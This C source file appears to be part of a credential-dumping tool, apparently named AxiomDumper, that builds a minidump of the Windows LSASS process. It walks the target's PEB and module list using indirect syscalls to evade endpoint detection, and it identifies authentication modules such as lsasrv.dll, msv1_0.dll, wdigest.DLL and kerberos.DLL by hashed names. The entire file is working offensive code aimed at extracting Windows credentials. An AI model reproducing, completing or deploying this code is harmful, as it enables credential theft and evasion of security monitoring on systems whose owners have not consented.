#include <stdio.h>

#include "AxiomDumper.h"
#include "SSN.h"
#include "SSN_Hashes.h"

BOOL read_ldr_entry(HANDLE hProcess, PVOID ldr_entry_address, struct CREDZ_LDR_DATA_TABLE_ENTRY* ldr_entry, wchar_t* base_dll_name)
{
    NTSTATUS status;

    IndirectSyscall(
        status,
        AXIOM_SSN_ZwReadVirtualMemory,
        hProcess,
        ldr_entry_address,
        ldr_entry,
        sizeof(struct CREDZ_LDR_DATA_TABLE_ENTRY),
        NULL
    );
    if (!NT_SUCCESS(status)) {
        printf("[FAILURE] Reading LDR addrss failed\n");
        return (false);
    }
    DEBUG_LOG("[EXTRACTOR] Reading LDR address from memory success\n");

    memset(base_dll_name, 0, MAX_PATH);
    IndirectSyscall(
        status,
        AXIOM_SSN_ZwReadVirtualMemory,
        hProcess,
        (PVOID)ldr_entry->BaseDllName.Buffer,
        base_dll_name,
        ldr_entry->BaseDllName.Length,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        printf("[FAILURE] Reading LDR base name\n");
        return (false);
    }
    DEBUG_LOG("[EXTRACTOR] Reading LDR base name from memory success\n");

    return (true);
}

PVOID get_peb_address(HANDLE hProcess)
{
    NTSTATUS status;
    PROCESS_BASIC_INFORMATION basic_info = { 0 };
    PROCESSINFOCLASS ProcessInformationClass = ProcessBasicInformation;

    basic_info.PebBaseAddress = 0;
    IndirectSyscall(
        status,
        AXIOM_SSN_NtQueryInformationProcess,
        hProcess,
        ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    );
    if (!NT_SUCCESS(status))
        return (0);

    DEBUG_LOG("[EXTRACTOR] PEB is at: 0x%px\n", basic_info.PebBaseAddress);
    return (basic_info.PebBaseAddress);
}

PVOID get_module_list_address(IN HANDLE hProcess)
{
    NTSTATUS status;
    PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, ldr_entry_address;

    peb_address = get_peb_address(hProcess);
    if (!peb_address)
        return NULL;

    status = 0;
    ldr_address = 0;
    ldr_pointer = RVA(PVOID, peb_address, LDR_POINTER_OFFSET);
    IndirectSyscall(
        status,
        AXIOM_SSN_ZwReadVirtualMemory,
        hProcess,
        (PVOID)ldr_pointer,
        &ldr_address,
        sizeof(PVOID),
        NULL
    );

    DEBUG_LOG("[EXTRACTOR] Reading LDR pointer from virtual memory, status = %d, ldr_address is now: 0x%p\n", status, ldr_address);
    if (!NT_SUCCESS(status)) {
        printf("[FAILURE] Reading LDR pointer failed\n");
        return (NULL);
    }
    DEBUG_LOG("[EXTRACTOR] Call success !\n");

    ldr_entry_address = NULL;
    module_list_pointer = RVA(PVOID, ldr_address, MODULE_LIST_POINTER_OFFSET);
    status = 0;
    IndirectSyscall(
        status,
        AXIOM_SSN_ZwReadVirtualMemory,
        hProcess,
        (PVOID)module_list_pointer,
        &ldr_entry_address,
        sizeof(PVOID),
        NULL
    );
    DEBUG_LOG("[EXTRACTOR] Reading modules head pointer from virtual memory, status = %d, entry address is now: 0x%p\n", status, ldr_entry_address);
    if (!NT_SUCCESS(status)) {
        DEBUG_LOG("[EXTRACTOR] Reading modules head pointer failed\n");
        return (NULL);
    }

    DEBUG_LOG("[EXTRACTOR] Module list address parsed: 0x%p\n", ldr_entry_address);
    return (ldr_entry_address);
}

PMODULEINFO add_new_module(IN HANDLE hProcess, IN struct CREDZ_LDR_DATA_TABLE_ENTRY* ldr_entry)
{
    DWORD name_size;
    NTSTATUS status;
    PMODULEINFO new_module = (PMODULEINFO)HeapAlloc(GetProcessHeap(), 0x00000008, sizeof(MODULEINFO));
    if (!new_module)
        return (NULL);

    new_module->next = NULL;
    new_module->dll_base = (ULONG64)(ULONG_PTR)ldr_entry->DllBase;
    new_module->size_of_image = ldr_entry->SizeOfImage;
    new_module->TimeDateStamp = ldr_entry->TimeDateStamp;
    new_module->CheckSum = ldr_entry->CheckSum;

    name_size = ldr_entry->FullDllName.Length > sizeof(new_module->dll_name) ?
        sizeof(new_module->dll_name) : ldr_entry->FullDllName.Length;

    IndirectSyscall(
        status,
        AXIOM_SSN_NtReadVirtualMemory,
        hProcess,
        (PVOID)ldr_entry->FullDllName.Buffer,
        new_module->dll_name,
        name_size,
        NULL
    );
    DEBUG_LOG("[EXTRACTOR] New module: %S successfully parsed and integrated into dump\n", new_module->dll_name);
    return new_module;
}

PMODULEINFO find_modules(HANDLE hProcess, const char* importantHashes[], int importantHashesCount)
{
    SHORT dlls_found;
    PMODULEINFO module_list = NULL;
    wchar_t base_dll_name[MAX_PATH];
    PVOID first_ldr_entry_address;
    struct CREDZ_LDR_DATA_TABLE_ENTRY ldr_entry;
    PVOID ldr_entry_address = get_module_list_address(hProcess);
    if (!ldr_entry_address)
        return NULL;

    dlls_found = 0;
    first_ldr_entry_address = NULL;
    while (dlls_found < importantHashesCount)
    {
        DEBUG_LOG("[EXTRACTOR] Looping over modules\n");
        BOOL success = read_ldr_entry(hProcess, ldr_entry_address, &ldr_entry, base_dll_name);
        if (!success)
            return NULL;
        if (!first_ldr_entry_address)
            first_ldr_entry_address = ldr_entry.InLoadOrderLinks.Blink;

        for (int i = 0; i < importantHashesCount; i++)
        {
            char* dllHash = drunk_md5(drunk_wchar_to_cstring(base_dll_name));
            if (drunk_strcmp(importantHashes[i], dllHash) == 0)
            {
                DEBUG_LOG("[EXTRACTOR] Module %ls (hash: %s) discovered at 0x%p\n", base_dll_name, dllHash, ldr_entry_address);
                PMODULEINFO new_module = add_new_module(hProcess, &ldr_entry);
                if (!new_module)
                    return NULL;

                if (!module_list)
                    module_list = new_module;
                else
                {
                    PMODULEINFO last_module = module_list;
                    while (last_module->next)
                        last_module = last_module->next;
                    last_module->next = new_module;
                }
                dlls_found++;
                break;
            }
        }

        ldr_entry_address = ldr_entry.InLoadOrderLinks.Flink;
        if (ldr_entry_address == first_ldr_entry_address)
            break;
    }

    return (module_list);
}

PMODULEINFO ELSASS_ExtractModulesList(PDUMPCONTEXT dc)
{
    ULONG32 stream_rva = dc->rva;
    ULONG32 full_name_length;
    PMODULEINFO module_list, curr_module;
    ULONG32 number_of_modules;
    ULONG32 stream_size;
    const char* importantHashes[] = {
        "d533f321138142de1140977b1c310b2e", //lsasrv.dll
        "312000ef4b384a934643d985ed4d2c4a", //samsrv.dll
        "3a6c79d56c394688d9e558332150b990", //ncrypt.dll
        "6e1d162b34e5bd4dda7e57997285f636", //kerberos.DLL
        "5ecc4ab573350a6260c6523f3459589f", //cryptdll.dll
        "2620408cc63e742ca481b9adbda118b0", //msv1_0.dll
        "da9fefb64b51df08ae17048b02330afd", //tspkg.dll
        "3f9470d2161bab4b6fd864d934614c9f", //cloudAP.DLL
        "333a784b709d4df8596618edfdf60d9a", //rsaenh.dll
        "e8d40307661601f509c8a8f244bafa0a", //wdigest.DLL
        "5eae283ed848f3ffdccb238426fe1b0f", //dpapisrv.dll
        "1dfcb83120acae27bd4722f126ddc1a5"  //ncryptprov.dll
    };

    DEBUG_LOG("[EXTRACTOR] Starting dump of modules list header\n");
    module_list = find_modules(dc->hProcess, importantHashes, ARRAY_SIZE(importantHashes));
    if (!module_list)
    {
        printf("[FAILURE] Failed to write the ModuleListStream\n");
        return (NULL);
    }
    DEBUG_LOG("[EXTRACTOR] Dumping modules success !\n");

    curr_module = module_list;
    number_of_modules = 0;
    while (curr_module)
    {
        full_name_length = ((ULONG32)wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name)) + 1) * 2;
        curr_module->name_rva = dc->rva;

        ELSASS_Append(dc, &full_name_length, 4, 0x00);
        ELSASS_Append(dc, curr_module->dll_name, full_name_length, 0x00);

        curr_module = curr_module->next;
        number_of_modules++;
    }

    stream_rva = dc->rva;
    ELSASS_Append(dc, &number_of_modules, 4, 0x00);
    BYTE module_bytes[SIZE_OF_MINIDUMP_MODULE] = { 0 };
    curr_module = module_list;
    while (curr_module)
    {
        DWORD offset = 0;
        DumpModule module = { 0 };

        module.BaseOfImage = (ULONG_PTR)curr_module->dll_base;
        module.SizeOfImage = curr_module->size_of_image;
        module.CheckSum = curr_module->CheckSum;
        module.TimeDateStamp = curr_module->TimeDateStamp;
        module.ModuleNameRva = curr_module->name_rva;

        memset(module_bytes, 0, sizeof(module_bytes));
        memcpy(module_bytes + offset, &module.BaseOfImage, 8); offset += 8;
        memcpy(module_bytes + offset, &module.SizeOfImage, 4); offset += 4;
        memcpy(module_bytes + offset, &module.CheckSum, 4); offset += 4;
        memcpy(module_bytes + offset, &module.TimeDateStamp, 4); offset += 4;
        memcpy(module_bytes + offset, &module.ModuleNameRva, 4); offset += 4;

        ELSASS_Append(dc, module_bytes, sizeof(module_bytes), 0x00);
        curr_module = curr_module->next;
    }

    stream_size = 4 + (number_of_modules * sizeof(module_bytes));
    ELSASS_Writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 4, &stream_size, 4, 0x00);
    ELSASS_Writeat(dc, SIZE_OF_HEADER + SIZE_OF_DIRECTORY + 4 + 4, &stream_rva, 4, 0x00);

    return (module_list);
}
